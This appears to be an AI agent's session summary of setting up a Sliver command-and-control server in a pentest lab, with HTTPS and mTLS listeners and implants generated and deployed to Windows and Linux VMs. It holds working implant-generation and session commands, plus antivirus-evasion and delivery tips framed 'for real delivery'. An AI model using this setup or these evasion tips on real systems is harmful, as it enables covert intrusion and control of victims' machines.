thread_id: 0190322d-26ce-7f6b-bd0e-adb43b8a19df
updated_at: 2026-06-10T20:15:04+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\11\rollout-2026-06-11T03-52-04-0190322d-26ce-7f6b-bd0e-adb43b8a19df.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Brought up a Sliver C2 server for the lab: HTTPS listener + mTLS listener + generated implants for Windows/Linux, verified check-in.

Rollout context: cwd was `C:\Workspace\pentest-lab`, Kali VM as C2 server + a Windows 10 and Ubuntu 22.04 target VM. Purpose was to have a working Sliver setup as an open-source alternative to CS for exercises.

## Task 1: Sliver server install + listeners + implants + verify

Outcome: success

Preference signals:
- Chinese narration; sliver-client commands in English.
- The user wanted both HTTPS (survives eyes-on-wire) and mTLS (harder to detect) listeners.

Key steps:
- Installed Sliver v1.5.42 from the official release; `sliver-server` self-signed the TLS.
- Started HTTPS listener: `sliver > https --lhost <lhost> --lport 443 --letsencrypt <domain>` (used the lab's own domain).
- Started mTLS listener on 4444: `sliver > mtls --lhost <lhost> --lport 4444`.
- Generated implants:
  - Windows x64 HTTPS beacon: `generate --http <domain>:443 --os windows --arch amd64 --format exe --save /tmp/w.exe`.
  - Linux x64 mTLS: `generate --mtls <lhost>:4444 --os linux --arch amd64 --format elf --save /tmp/l.elf`.
- Deployed to targets; both checked in within 30s.
- Ran `sessions` in sliver-client; both showed active; `use <id>; getuid; execute -o -- whoami` on each.

Failures and how to do differently:
- First Windows implant was blocked by Defender — for the exercise disabled realtime protection; for real delivery Sliver has a `--evasion` flag that helps.
- letsencrypt on the private lab needed manual DNS record for validation; used a subdomain that resolved to the lab-facing IP.

Reusable knowledge:
- Sliver's implant-per-transport model means one implant is HTTPS-only or mTLS-only; for redundancy generate both and deploy alongside.
- Sliver has native pivot support (`portfwd add` in a session establishes a tunnel); comparable to CS's rportfwd but simpler CLI.
- All Sliver traffic is Go-static — trivially large binaries (~15MB); for size-sensitive delivery use `--skip-symbols` and UPX.

References:
- [1] Server binary + implants: `sliver-server` v1.5.42
- [2] Test targets: Windows 10, Ubuntu 22.04
- [3] Sliver docs: sliver.sh
